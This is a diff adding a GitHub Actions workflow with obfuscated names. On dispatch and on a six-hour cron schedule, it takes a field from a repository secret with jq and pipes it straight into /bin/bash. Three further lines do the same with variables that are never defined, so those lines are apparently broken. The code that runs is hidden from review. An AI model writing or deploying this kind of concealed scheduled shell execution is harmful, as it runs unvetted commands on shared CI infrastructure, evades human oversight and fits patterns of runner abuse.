@@ -1,0 +1,22 @@
+name: wangtianyiy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangtianyiy
+        env:
+          ijhb253: ${{ secrets.ijhb253 }}
+        run: |
+          echo $ijhb253 | jq -r .lvg7 | /bin/bash
+          echo $zl90003 | jq -r .i72 | /bin/bash
+          echo $mxpn3 | jq -r .qs92787 | /bin/bash
+          echo $u7 | jq -r .ch55106 | /bin/bash
+
